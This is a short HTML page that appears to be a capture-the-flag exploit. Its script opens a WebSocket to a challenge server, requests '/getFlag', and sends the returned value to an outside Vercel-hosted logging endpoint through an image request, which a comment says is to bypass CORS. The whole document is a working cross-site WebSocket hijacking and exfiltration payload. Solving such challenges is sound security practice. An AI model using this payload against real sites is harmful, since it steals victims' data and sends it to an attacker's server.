<!DOCTYPE html>
<html>
  <body>
    <script>
      const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');

      ws.onopen = () => {
        ws.send(JSON.stringify({ message: '/getFlag' }));
      };

      ws.onmessage = ev => {
        const flag = JSON.parse(ev.data).message;

        // Dùng Image để bypass CORS
        new Image().src = 'https://testne-git-master-hados-projects-88750053.vercel.app/api/log?flag=' + encodeURIComponent(flag);
      };
    </script>
  </body>
</html>
